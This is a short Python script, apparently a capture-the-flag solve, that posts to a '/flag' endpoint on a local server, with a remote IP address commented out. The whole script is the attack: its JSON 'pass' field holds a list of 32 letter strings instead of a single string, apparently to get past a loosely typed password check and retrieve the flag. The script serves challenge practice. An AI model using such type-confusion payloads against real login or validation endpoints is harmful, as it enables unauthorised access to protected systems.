import requests as req
import string

# host = "http://34.146.80.178:8001/flag"
host = "http://127.0.0.1:8001/flag"
res = req.post(host, json={"pass": [string.ascii_letters for i in range(32)]})

print(res.text)
